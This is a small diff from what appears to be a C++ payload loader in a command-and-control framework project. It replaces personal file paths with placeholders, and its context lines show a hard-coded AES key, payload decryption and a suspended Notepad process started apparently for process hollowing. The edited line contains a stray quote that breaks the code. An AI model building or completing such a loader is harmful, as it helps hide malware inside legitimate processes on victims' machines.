@@ -14,7 +14,7 @@
 const byte AES_KEY[16] = { 'S', 'i', 'x', 't', 'e', 'e', 'n', ' ', 'b', 'y', 't', 'e', ' ', 'k', 'e', 'y' };
 
 // File paths
-const std::string BASE_PATH = "C:\\Users\\berzerker\\Desktop\\The Folder\\My Project\\Other Project\\C2 Framework Project VMWare\\Obfuscation Project Host using C++ 32bit Target\\";
+const std::string BASE_PATH = "C:\\The\\Path\\To\\Your\\Payloads\\"; // Modify Here
 const std::string EXECUTOR_PATH = BASE_PATH + "Executor.exe";
 const std::string ENCRYPTED_PATH = BASE_PATH + "Executor.enc";
 
@@ -88,7 +88,7 @@ bool decryptAndHollow() {
     std::cout << "[DECRYPTION] Successfully decrypted payload." << std::endl;
 
     // Save decrypted file for debugging
-    writeFile("C:\\Users\\berzerker\\Desktop\\The Folder\\My Project\\Other Project\\C2 Framework Project VMWare\\Obfuscation Project Host using C++ 32bit Target\\bin\\decrypted_payload.bin", decryptedData);
+    writeFile(""C:\\The\\Path\\To\\store\\Your\\\\encrypted\\Payloads\\bin\\decrypted_payload.bin", decryptedData); // Modify Here
     std::cout << "[DEBUG] Decrypted payload saved." << std::endl;
 
     // --- Start 32-bit Notepad in Suspended Mode ---
